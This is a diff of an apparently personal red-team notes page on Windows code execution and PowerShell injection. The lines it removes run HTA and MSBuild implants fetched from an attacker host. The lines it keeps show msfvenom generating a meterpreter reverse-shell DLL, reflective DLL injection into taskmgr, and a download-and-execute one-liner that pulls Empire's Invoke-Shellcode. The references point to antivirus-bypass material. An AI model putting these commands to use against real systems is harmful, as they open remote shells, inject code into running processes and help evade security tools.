@@ -1,30 +1,8 @@
-# Windows
+# PowerSploit
 
-## 01 - Code Execution
+## 01 - Reflective DLL Injection
 
-### 1.1 - HTA
-
-```
-C:\> mshta <drive_letter>:\absolute\path\to\implant.hta
-
-C:\> mshta http[s]://<IP>/implant.hta
-```
-
-### 1.2 - MSBuild
-
-Execute C# project implants.
-
-```
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.csproj
-
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.xml
-```
-
-## 02 - Powershell Scripts
-
-### 1.1 - Reflective DLL Injection
-
-#### 1.1.1 - Simple Reflective DLL Injection
+### 1.1 - Simple Reflective DLL Injection
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 exitfunc=thread -f dll -o shellcode.dll
@@ -48,7 +26,7 @@ $procid = (Get-Process -Name taskmgr).Id
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
 
-#### 1.1.2 - Reflective DLL Injection with encoded base64 shellcode DLL
+### 1.2 - Reflective DLL Injection with encoded base64 shellcode DLL
 
 TODO: Figure out the base64 encoding problem with DLL files
 
@@ -88,7 +66,7 @@ $procid = (Get-Process -Name taskmgr).Id
 Invoke-ReflectivePEInjection -PEBytes $decoded -ProcId $procid
 ```
 
-### 1.2 - Invoke-Shellcode
+## 02 - Invoke-Shellcode
 
 ```powershell
 IEX((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/code_execution/Invoke-Shellcode.ps1"))
@@ -101,13 +79,7 @@ Invoke-Shellcode -ProcessId $procid -Shellcode @(<ps1_shellcode_format>)
 ---
 ## References
 
-- [[DotNET Execution|Code Execution: MSBuild]]
-
 - [charnim: Invoke-ReflectivePEInjection](https://github.com/charnim/Invoke-ReflectivePEInjection.ps1)
-
-- [Red Team Notes: Code Execution](https://www.ired.team/offensive-security/code-execution)
-
-- [Sevagas: Hacking around HTA files](https://blog.sevagas.com/?Hacking-around-HTA-files)
 
 - [Adamn Chester (XPN) YouTube Video: Bypass AV with Invoke-ReflectivePEInjection](https://www.youtube.com/watch?v=byMBx4q-vYo)
 
